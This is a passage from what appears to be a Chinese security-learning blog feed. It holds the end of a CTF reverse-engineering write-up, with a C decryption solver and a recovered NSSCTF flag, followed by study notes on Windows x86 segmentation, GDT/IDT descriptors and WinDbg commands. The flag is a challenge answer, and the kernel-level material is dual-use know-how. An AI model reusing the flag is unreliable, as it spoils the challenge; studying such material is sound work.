class="number">26</span>) % <span class="number">26</span>;</span><br><span class="line">a1[j] = (val * inv) % <span class="number">26</span> + base;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_case3</span><span class="params">(<span class="type">char</span>* a1, <span class="type">const</span> <span class="type">char</span>* a2)</span> &#123;</span><br><span class="line"><span class="type">int</span> lena1 = <span class="built_in">strlen</span>(a1);</span><br><span class="line"><span class="type">int</span> v10 = a2[<span class="number">0</span>] % <span class="number">10</span> + <span class="number">2</span>;  <span class="comment">// 必须与加密时相同的行数</span></span><br><span class="line"><span class="type">int</span> cols = (lena1 + v10 - <span class="number">1</span>) / v10; <span class="comment">// 最大列数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配二维矩阵（考虑不完整行）</span></span><br><span class="line"><span class="type">char</span>** Block = <span class="built_in">malloc</span>(v10 * <span class="keyword">sizeof</span>(<span class="type">char</span>*));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v10; ++i) &#123;</span><br><span class="line">Block[i] = <span class="built_in">malloc</span>(cols + <span class="number">1</span>); <span class="comment">// 每行分配最大可能长度+1</span></span><br><span class="line"><span class="built_in">memset</span>(Block[i], <span class="number">0</span>, cols + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态计算每行的实际列数</span></span><br><span class="line"><span class="type">int</span>* row_lengths = <span class="built_in">malloc</span>(v10 * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v10; ++i) &#123;</span><br><span class="line">row_lengths[i] = lena1 / v10; <span class="comment">// 基本列数</span></span><br><span class="line"><span class="keyword">if</span> (i &lt; lena1 % v10) row_lengths[i]++; <span class="comment">// 处理余数分配</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按行填充数据（考虑不等长行）</span></span><br><span class="line"><span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> row = <span class="number">0</span>; row &lt; v10; ++row) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> col = <span class="number">0</span>; col &lt; row_lengths[row]; ++col) &#123;</span><br><span class="line"><span class="keyword">if</span> (pos &lt; lena1) &#123;</span><br><span class="line">Block[row][col] = a1[pos++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按列读取恢复原始数据（处理不规则形状）</span></span><br><span class="line">pos = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> col = <span class="number">0</span>; col &lt; cols; ++col) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> row = <span class="number">0</span>; row &lt; v10; ++row) &#123;</span><br><span class="line"><span class="comment">// 只读取有效列范围内的数据</span></span><br><span class="line"><span class="keyword">if</span> (col &lt; row_lengths[row] &amp;&amp; pos &lt; lena1) &#123;</span><br><span class="line">a1[pos++] = Block[row][col];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">a1[pos] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 终止字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 清理内存</span></span><br><span class="line"><span class="built_in">free</span>(row_lengths);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v10; ++i) <span class="built_in">free</span>(Block[i]);</span><br><span class="line"><span class="built_in">free</span>(Block);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_case4</span><span class="params">(<span class="type">char</span>* str, <span class="type">const</span> <span class="type">char</span>* key)</span> &#123;</span><br><span class="line"><span class="comment">// 手动计算有效字符串长度（包含空格）</span></span><br><span class="line"><span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (str[len] != <span class="string">&#x27;\0&#x27;</span>) len++;</span><br><span class="line"><span class="keyword">if</span> (len == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 计算等效逆向移位次数</span></span><br><span class="line"><span class="type">int</span> shift = (key[<span class="number">0</span>] % <span class="number">10</span> + <span class="number">2</span>) % len; <span class="comment">// 加密时的实际有效移位</span></span><br><span class="line"><span class="type">int</span> decrypt_shift = (len - shift) % len;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行逆向循环右移</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; decrypt_shift; ++i) &#123;</span><br><span class="line"><span class="comment">// 保存最后一个有效字符（包括空格）</span></span><br><span class="line"><span class="type">char</span> last = str[len - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 整体右移一位</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = len - <span class="number">1</span>; j &gt; <span class="number">0</span>; --j) &#123;</span><br><span class="line">str[j] = str[j - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 恢复首字符</span></span><br><span class="line">str[<span class="number">0</span>] = last;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_case5</span><span class="params">(<span class="type">char</span>* a1, <span class="type">const</span> <span class="type">char</span>* a2)</span> &#123;</span><br><span class="line"><span class="type">int</span> lena2 = <span class="built_in">strlen</span>(a2);</span><br><span class="line"><span class="type">int</span> lena1 = base64_decode(a1);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = lena1; i &lt; lena1 + <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a1[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lena1; ++i) &#123;</span><br><span class="line"> a1[i] ^= (a2[i % lena2] + <span class="number">57</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;%s&quot;, a1);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_case6</span><span class="params">(<span class="type">char</span>* a1,<span class="type">const</span> <span class="type">char</span>* a2)</span> &#123;</span><br><span class="line"><span class="type">int</span> lena1 = base64_decode(a1);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* a3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">memset</span>(a3, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = lena1; i &lt; lena1 + <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a1[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rc41(a1, a2, a3, lena1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt_case7</span><span class="params">(<span class="type">char</span> *a1,<span class="type">const</span> <span class="type">char</span>* a2)</span> &#123;</span><br><span class="line"><span class="type">int</span> lena1 = base64_decode(a1);</span><br><span class="line"><span class="type">int</span>* a3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = lena1; i &lt; lena1 + <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a1[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rc42(a1, a2, a3, lena1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">crypt</span><span class="params">(<span class="type">char</span> *a1,<span class="type">const</span> <span class="type">char</span>* a2,<span class="type">int</span> a3)</span> &#123;</span><br><span class="line"><span class="keyword">switch</span> (a3) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">decrypt_case1(a1, a2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">decrypt_case2(a1, a2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">decrypt_case3(a1, a2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">decrypt_case4(a1, a2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">decrypt_case5(a1, a2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">decrypt_case6(a1, a2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">decrypt_case7(a1, a2);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> v15[<span class="number">8</span>];</span><br><span class="line"><span class="type">char</span> v16[<span class="number">3</span>];</span><br><span class="line"><span class="type">char</span> v11[<span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> i, j, v10;</span><br><span class="line"><span class="type">char</span> i1[<span class="number">100</span>] = <span class="string">&quot;WgvDmssEvcY326bHo3nNro3vXvvfmgrz&quot;</span>;</span><br><span class="line"><span class="type">char</span> i2[<span class="number">100</span>] = <span class="string">&quot;gX+Ri9PG=bt5=00B6hscPQOL&quot;</span>;</span><br><span class="line"><span class="type">char</span> i3[<span class="number">100</span>] = <span class="string">&quot;T6bHgUPL2gXUd=xT=FNHtPzV&quot;</span>;</span><br><span class="line"><span class="comment">//aaaaaaaaaaaabbbbbbbbbbbbcccccccccccc</span></span><br><span class="line">v15[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">v15[<span class="number">1</span>] = <span class="number">5</span>;</span><br><span class="line">v15[<span class="number">2</span>] = <span class="number">6</span>;</span><br><span class="line">v15[<span class="number">3</span>] = <span class="number">3</span>;</span><br><span class="line">v15[<span class="number">4</span>] = <span class="number">4</span>;</span><br><span class="line">v15[<span class="number">5</span>] = <span class="number">1</span>;</span><br><span class="line">v15[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">v15[<span class="number">7</span>] = <span class="number">5</span>;</span><br><span class="line">v16[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">v16[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">v16[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">v11[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">v11[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">v11[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> ca1[] = &#123; <span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">1</span>, &#125;;</span><br><span class="line"><span class="type">char</span> jj[] = &#123; <span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>, &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (jj[i]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">crypt(i1, i2, ca1[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i1 i2\n%d-%d:&quot;</span>, jj[i], ca1[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, i1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">crypt(i2, i3, ca1[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i2 i3\n%d-%d:&quot;</span>, jj[i], ca1[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, i2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">crypt(i3, i1, ca1[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i3 i1\n%d-%d:&quot;</span>, jj[i], ca1[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, i3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i1:%s\ni2:%s\ni3:%s\n\n&quot;</span>, i1, i2, i3);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//for (i = 0; i &lt; 8; ++i)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//for (j = 0; j &lt; 3; ++j)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//if (i &gt;= v16[j])</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v10 = v11[j];</span></span><br><span class="line"><span class="comment">//if (v10 &lt; 8)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//if (j)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//if (j == 1)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">////crypt(i2, i3, ca1);</span></span><br><span class="line"><span class="comment">//printf(&quot;%d,&quot;, j);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else if (j == 2)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">////crypt(i3, i1, ca1);</span></span><br><span class="line"><span class="comment">//printf(&quot;%d,&quot;, j);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">////crypt(i1, i2, ca1);</span></span><br><span class="line"><span class="comment">//printf(&quot;%d,&quot;, j);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//++v11[j];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, i1[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, i2[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, i3[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//char ca[] = &#123; 0,0,1,0,1,2,0,1,2,0,1,2,0,1,2,0,1,2,0,1,2, &#125;;</span></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 21; i++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//printf(&quot;%d,&quot;,ca[21 -1- i]);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//for (int i = strlen(ca)-1; i &gt;= 0; i--)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//switch (ca[i]) &#123;</span></span><br><span class="line"><span class="comment">//case 1:</span></span><br><span class="line"><span class="comment">//decrypt_case1();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//NSSCTF&#123;P4ch3Lbel&#x27;s_C@n0n_1n_D_mAjOr&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WindowsStudy01-保护机制&amp;段检测</title>
      <link href="/2025/04/06/WindowsStudy01-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6&amp;%E6%AE%B5%E6%A3%80%E6%B5%8B/"/>
      <url>/2025/04/06/WindowsStudy01-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6&amp;%E6%AE%B5%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<p>保护机制、段、页</p><span id="more"></span><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>首先铺垫，在前面学过pe文件格式，且写过反射型注入，有一定知识前置</p><p>我们知道，一个软件在运行的时候，会分配一个内存中的基地址（虚拟地址），很好，那么明明是在内存中实体存在的为什么叫虚拟地址？我们还知道，地址是线性的0 1 2 …… 0xffffffffh，线性排布，那么问题来了，我的程序加载到内存中，假如说是0x87654321，欸？此时我有一个指令是mov dword ptr [0] , 1，那么会把内存开始地方的东西改动掉，但是内存最开始的东西肯定是很内核的东西，什么对程序的调用啊，什么的之前在反调试有接触过</p><p>自然是不能让你随便动他的，那么怎么才能很安全的做到呢</p><p>目前我学到的是分段分页，相当于在原本的0x55555555h的地方一刀斩断，后面又开始0x0h（应该如此，后续回来补充）</p><p>嗯不是这样的，是分成一段一段然后通过代码段，数据段来区分，这是段保护机制</p><p>页保护估计就是进程线程的吧。。。</p><h2 id="windbg的一些指令"><a href="#windbg的一些指令" class="headerlink" title="windbg的一些指令"></a>windbg的一些指令</h2><p>r查看一些寄存器(r eax | r al | r gdtr)</p><p>d查看地址(byte(db) | word(dw) | … ) | (L limit 限制要看多长) | (s 竖着看)</p><p>e写内存(用法和d一致)</p><h2 id="idt和gdt"><a href="#idt和gdt" class="headerlink" title="idt和gdt"></a>idt和gdt</h2><p>idt和gdt结构前两字节是limit大小，后四字节是地址</p><h2 id="idt和gdt的指令"><a href="#idt和gdt的指令" class="headerlink" title="idt和gdt的指令"></a>idt和gdt的指令</h2><p>sidt sgdt 用例就是把gdt表和idt表加载出来</p><p>lidt lgdt 赋值给他</p><h2 id="门符框架"><a href="#门符框架" class="headerlink" title="门符框架"></a>门符框架</h2><p>很好前面虽然很乱但是捋一下就清晰了，本篇文章只用来构造框架，具体的内容将在其他文章细记</p><h3 id="门符"><a href="#门符" class="headerlink" title="门符"></a>门符</h3><p>注意注意，门或符GDT表或IDT中每个单元的名称！！！</p><p>每个单元都有-P位 S位 Type位</p><p>P-决定该描述符有效</p><p>S-决定该描述符属于什么类型</p><p>T-决定改描述符更具体类型</p><p><strong>声明1</strong>：门和xx段描述符感觉差不多一个意思</p><h4 id="s-1-段描述符"><a href="#s-1-段描述符" class="headerlink" title="s&#x3D;1-段描述符"></a>s&#x3D;1-段描述符</h4><p>s&#x3D;1是段描述符，这时候的T遵循的图就是<img src="/.io//tool\blog\source\postpic\windows1\1.png" loading="lazy"></p><h5 id="t"><a href="#t" class="headerlink" title="t&lt;8-数据段 GDT"></a>t&lt;8-数据段 GDT</h5><h5 id="t-7-代码段-GDT"><a href="#t-7-代码段-GDT" class="headerlink" title="t&gt;7-代码段 GDT"></a>t&gt;7-代码段 GDT</h5><p>数据段或代码段，同时无论是数据段还是代码段都解析的都是如下图<img src="/.io//tool\blog\source\postpic\windows1\2.png" loading="lazy"></p><h4 id="s-0-系统描述符"><a href="#s-0-系统描述符" class="headerlink" title="s&#x3D;0-系统描述符"></a>s&#x3D;0-系统描述符</h4><p>s&#x3D;0是系统描述符，这时候的T遵循的图就是<img src="/.io//tool\blog\source\postpic\windows1\3.png" loading="lazy"></p><h5 id="t-c-调用门-GDT"><a href="#t-c-调用门-GDT" class="headerlink" title="t&#x3D;c-调用门 GDT"></a>t&#x3D;c-调用门 GDT</h5><p>调用门遵循下图<img src="/.io//tool\blog\source\postpic\windows1\4.png" loading="lazy"></p><h5 id="t-6-中断门-IDT"><a href="#t-6-中断门-IDT" class="headerlink" title="t&#x3D;6 -中断门 IDT"></a>t&#x3D;6 -中断门 IDT</h5><p>int 3 int 2 int 1…遵循下图<img src="/.io//tool\blog\source\postpic\windows1\5.png" loading="lazy"></p><h5 id="t-5-任务门-IDT"><a href="#t-5-任务门-IDT" class="headerlink" title="t&#x3D;5-任务门 IDT"></a>t&#x3D;5-任务门 IDT</h5><p><img src="/.io//tool\blog\source\postpic\windows1\6.png" loading="lazy"></p><h2 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h2><h3 id="段选择符"><a href="#段选择符" class="headerlink" title="段选择符"></a>段选择符</h3><p><img src="/.io//tool\blog\source\postpic\windows1\7.png" loading="lazy"></p><p>长度一字节，比如CS里的1B值就是段选择符（0x18是打印cs值会打印出来的）</p><p>1B：0000 0000 0001 1      0 11</p><p>0011       查找表   请求权限</p><p>   3，在表中的第3位  0&#x3D;GDT  Global Decsrctor Table(全局描述表)</p><p> 1&#x3D;LDTLocal Decsrctor Table(本地描述表)</p><p>CS1B 代码段</p><p>SS23 栈段(栈，局部变量)</p><p>DS23 数据段(堆，全局变量)</p><p>ES23 扩展段(可以还原ds)</p><p>FS上下文环境段R3代表TEB R0代码是KPCR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// study02.cpp : 定义控制台应用程序的入口点。</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">int val=0x100;</span><br><span class="line">int val2=0x1;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov ax,cs;</span><br><span class="line">        mov dword ptr ds:[val2],eax;</span><br><span class="line">    &#125;;</span><br><span class="line">    printf(&quot;%x\n&quot;,val2);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="段描述符-1"><a href="#段描述符-1" class="headerlink" title="段描述符"></a>段描述符</h3><p>也就是前面的GDT和LDT表的内容</p><p>举个例子：</p><blockquote><p>kd&gt; r gdtr</p><p>gdtr&#x3D;80b98800</p></blockquote><p>通过查找指令找到gdt表，gdt表是按照1字也就是两字节的形式为最小单位，所以查找的时候要用dq</p><blockquote><p>kd&gt; dq 80b98800</p><p>80b98800  00000000<code>00000000 00cf9b00</code>0000ffff</p><p>80b98810  00cf9300<code>0000ffff 00cffb00</code>0000ffff</p><p>80b98820  00cff300<code>0000ffff 80008bb9</code>8c0020ab</p><p>80b98830  804093b9<code>b0004fff 0040f300</code>00000fff</p><p>80b98840  0000f200<code>0400ffff 00000000</code>00000000</p><p>80b98850  800089b9<code>ad200067 800089b9</code>acb00067</p><p>80b98860  00000000<code>00000000 00000000</code>00000000</p><p>80b98870  800092b9<code>880003ff 00000000</code>00000000</p></blockquote><p>按照上面索引第三个(注意，从0开始数)  00cffb00&#96;0000ffff，和段选择符一样，要拆分分析</p><p><img src="/.io//tool\blog\source\postpic\windows1\8.png" loading="lazy"></p><p>对照上表，高字节部分和低字节部分</p><p>31    24      19     16            12     8     0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00  c       f   f       b   00</span><br></pre></td></tr></table></figure><p>   1100    1111</p><p>h: b   gb0al   hd stb</p><p>  0000ffff</p><p>l: b  l</p><p>limit:f+ffff&#x3D;0xfffff段限制大小(sizeof(cs)):(h&amp;l)+(l&amp;l)</p><p>base:00+00+0000基址大小(base):(h&amp;b)+(h&amp;b)+(l&amp;b)</p><p>type:(h&amp;t)btpye作用见下表</p><p>s:(h&amp;s)1</p><p>DPL:(h&amp;d)3</p><p>p:(h&amp;p)1p用来证明该段是否有效，1有效，0无效</p><p>avl:(h&amp;a)0</p><p>0:(h&amp;0)0</p><p>D&#x2F;B:(h&amp;b)1</p><p>G:(h&amp;g)1若为1，则以页为单位（影响的是段限制的单位）（一个页4096字节） 转换为hex-&gt;0x1000</p><p>故真正限制大小：(limit+1)*(g)按照上面的计算也就是(0xfffff+1)*0x1000&#x3D;0x1 0000 0000，范围就是0-0xf ffff fff也就是4个g</p><p>type作用：<img src="/.io//tool\blog\source\postpic\windows1\9.png" loading="lazy"></p><h4 id="练习代码"><a href="#练习代码" class="headerlink" title="练习代码"></a>练习代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">// study02.cpp : 定义控制台应用程序的入口点。</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">int val=0x100;</span><br><span class="line"></span><br><span class="line">int _tmain(int argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    int val2=0x1;</span><br><span class="line">    //段保护</span><br><span class="line">    __asm&#123;</span><br><span class="line">        mov ax,cs;</span><br><span class="line">        mov ds,ax;</span><br><span class="line">        mov eax,dword ptr ds:[val]; //ds:[val]就是全局变量val</span><br><span class="line">        //mov dword ptr ds:[val2],eax;//直接这样会报错，因为cs给了ds，cs段是可读可执行不可写，这里相当于写入所以不可以</span><br><span class="line">        //恢复ds环境</span><br><span class="line">        mov ax,es;</span><br><span class="line">        mov ds,ax;</span><br><span class="line">        //可以赋值</span><br><span class="line">        mov [val2],eax;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;val2=%x\n&quot;,val2);</span><br><span class="line">    //0x100</span><br><span class="line"></span><br><span class="line">    //查看段选择符</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov ax,cs;</span><br><span class="line">        mov 